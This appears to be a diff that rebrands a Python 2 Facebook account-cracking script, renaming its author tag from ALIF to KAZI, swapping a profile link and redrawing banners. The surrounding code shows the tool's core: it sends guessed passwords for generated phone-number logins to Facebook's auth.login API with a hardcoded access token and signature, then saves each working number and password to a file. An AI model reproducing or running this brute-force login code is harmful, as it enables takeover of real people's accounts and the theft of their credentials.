@@ -114,7 +114,8 @@ print """
 
 logo1 = """
 \033[1;95m        
-\033[1;95m       
+\033[1;95m      
+==========================================================
  
    ▄█   ▄█▄    ▄████████  ▄███████▄   ▄█  
   ███ ▄███▀   ███    ███ ██▀     ▄██ ███  
@@ -125,7 +126,8 @@ logo1 = """
   ███ ▀███▄   ███    ███ ███▄     ▄█ ███  
   ███   ▀█▀   ███    █▀   ▀████████▀ █▀   
   ▀                                       
-       
+   
+==========================================================
 
 \033[1;95m       
 \033[1;95m   
@@ -135,6 +137,7 @@ logo1 = """
 logo= """
 \033[1;93m            
  
+===================================================
  
 ██╗  ██╗ █████╗ ███████╗██╗
 ██║ ██╔╝██╔══██╗╚══███╔╝██║
@@ -143,7 +146,7 @@ logo= """
 ██║  ██╗██║  ██║███████╗██║
 ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝
                            
-
+===================================================
 
 
 \033[1;95m             
@@ -155,8 +158,8 @@ loop = 'true'
 while loop == 'true':
     PassWord = raw_input('\x1b[1;93m[\x1b[1;92m[ALIF]\033[1;93m] \x1b[1;91m[♻️] Enter PassWord\x1b[1;97m: ')
     if (PassWord == CorrectPassWord):
-        print('\n            \x1b[1;92m✔️ Correct Entry ✔️ \n                  ')
-        jalan('    \x1b[1;97m=========== WELCOME TO DARK WORLD ===========')
+        print('\n            \x1b[1;92m🆗 Correct Entry 🆗 \n                  ')
+        jalan('    \x1b[1;97m+-+-+-+-+-+-+-+-+-+-+-+-+- WELCOME TO DARK WORLD +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+')
         loop = 'false'
     else:
         print '\x1b[1;91mWrong Entry!'
@@ -196,14 +199,14 @@ def login1():
 
 
 def pilih_login1():
-    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m[ALIF]\033[1;91m] \x1b[1;95m[◈] \x1b[1;95mChoose an Option:\x1b[1;98m')
+    peak = raw_input('\n\x1b[1;91m[\x1b[1;91m[KAZI]\033[1;91m] \x1b[1;95m[◈] \x1b[1;95mChoose an Option:\x1b[1;98m')
     if peak == '':
         print '\x1b[1;91mFill In Correctly'
         pilih_login1()
     elif peak == '1':
         Zk()
     elif peak == '2':
-        os.system('xdg-open https://www.facebook.com/Alifvau6969')
+        os.system('xdg-open https://www.facebook.com/M182B.SADHON')
         login1()
     elif peak == '0':
         keluar()
@@ -215,9 +218,9 @@ def pilih_login1():
 def Zk():
     os.system('clear')
     print logo1
-    print '\x1b[1;93m[\x1b[1;92m[ALIF]\033[1;93m] \x1b[1;93m[1]\x1b[1;93m ALIF Start The Process'
+    print '\x1b[1;93m[\x1b[1;92m[KAZI]\033[1;93m] \x1b[1;93m[1]\x1b[1;93m ALIF Start The Process'
     time.sleep(0.05)
-    print '\x1b[1;93m[\x1b[1;92m[ALIF]\033[1;93m] \x1b[1;93m[0]\x1b[1;93m Go Back To The Previous Menu'
+    print '\x1b[1;93m[\x1b[1;92m[KAZI]\033[1;93m] \x1b[1;93m[0]\x1b[1;93m Go Back To The Previous Menu'
     time.sleep(0.05)
     pilih_Zk()
 
@@ -288,7 +291,7 @@ def automatic():
     jalan('[☣️] \x1b[1;97mTotal Numbers: ' + xxx)
     jalan('\x1b[1;97m[☣️] \x1b[1;97mTrying Passwords Wait...')
     print 50 * '\x1b[1;95m◈'
-    print '\x1b[1;95m◈◈◈◈◈◈◈◈◈◈◈ Developed By ALIF VAU ◈◈◈◈◈◈◈◈◈◈◈ '
+    print '\x1b[1;95m◈◈◈◈◈◈◈◈◈◈◈ Developed By Kazi Vau ◈◈◈◈◈◈◈◈◈◈◈ '
 
     def main(arg):
         user = arg
@@ -302,7 +305,7 @@ def automatic():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[ALIF]    ' + k + c + user + '  \x1b[1;97m|  ' + pass1
+                print '\x1b[1;92m[KAZI]    ' + k + c + user + '  \x1b[1;97m|  ' + pass1
                 okb = open('cloned/idz.txt', 'a')
                 okb.write(k + c + user + pass1 + '\n')
                 okb.close()
